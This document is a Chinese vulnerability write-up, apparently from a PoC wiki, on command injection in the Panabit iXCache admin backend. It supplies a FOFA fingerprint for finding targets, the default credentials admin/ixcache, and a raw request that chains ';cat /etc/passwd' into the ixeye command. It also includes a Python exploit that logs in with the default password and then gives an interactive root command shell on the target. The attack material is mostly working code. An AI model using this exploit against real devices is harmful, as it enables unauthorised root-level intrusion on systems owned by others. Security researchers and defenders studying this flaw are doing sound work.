# Panabit iXCache ajax_cmd 后台命令执行漏洞

## 漏洞描述

Panabit iXCache  后台 ixeye指令输入时存在命令拼接漏洞，将会以Root权限执行任意代码

## 漏洞影响

> [!NOTE]
>
> Panabit iXCache

## FOFA

> [!NOTE]
>
> "iXCache"

## 漏洞复现

登录页面如下

![](http://wikioss.peiqi.tech/vuln/pa-1.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

默认账号密码为：**admin/ixcache**

![](http://wikioss.peiqi.tech/vuln/pa-2.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

进入后台后点击命令行，访问Url

```
/cgi-bin/Maintain/cfg_cmd
```

![](http://wikioss.peiqi.tech/vuln/pa-3.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

输入命令时使用 **;** 即可命令拼接执行任意命令

请求包为

```
POST /cgi-bin/Maintain/ajax_cmd?action=runcmd&cmd=ixeye%20;cat%20/etc/passwd HTTP/1.1
Host: 
Connection: close
Content-Length: 0
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"
Accept: */*
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: _walkthrough-introduction=0; pauser_1615540522_368691=paonline_admin_73708_16196903931;Path=/
```

## 漏洞POC

```python
import requests
import sys
import random
import re
import base64
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mTitle  : Panabit iXCache cfg_cmd 后台命令执行漏洞                   \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/login/userverify.cgi"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = "username=admin&password=ixcache"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers,data=data, verify=False, timeout=5)
        print("\033[36m[o] 正在请求 {}/login/userverify.cgi.... \033[0m".format(target_url))
        if '/cgi-bin/monitor.cgi' in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {} 存在默认口令 admin/ixcache \033[0m".format(target_url))
            cookie = response.headers['Set-Cookie']
            print("\033[36m[o] 获取Cookie : {} \033[0m".format(cookie))
            POC_2(target_url, cookie)
        else:
            print("\033[31m[x] 请求失败 \033[0m")
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_2(target_url, Cookie):
    vuln_url = target_url + "/cgi-bin/Maintain/ajax_cmd?action=runcmd&cmd=ixeye%20;cat%20/etc/passwd"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": "_walkthrough-introduction=0;{}".format(Cookie)
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, verify=False, timeout=5)
        if 'root' in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 ,执行 cat /etc/passwd \033[0m".format(target_url))
            print("\033[36m[o] 响应为:\n{} \033[0m".format(response.text))
            while True:
                Cmd = input("\033[35mCmd >>> \033[0m")
                if Cmd == "exit":
                    sys.exit(0)
                else:
                    POC_3(target_url, Cmd, Cookie)
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_3(target_url, Cmd, Cookie):
    Cmd = Cmd.replace(" ", "%20")
    vuln_url = target_url + "/cgi-bin/Maintain/ajax_cmd?action=runcmd&cmd=ixeye%20;{}".format(Cmd)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": "_walkthrough-introduction=0;{}".format(Cookie)
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 响应为:\n{} \033[0m".format(response.text))

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    POC_1(target_url)
```

![](http://wikioss.peiqi.tech/vuln/pa-4.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)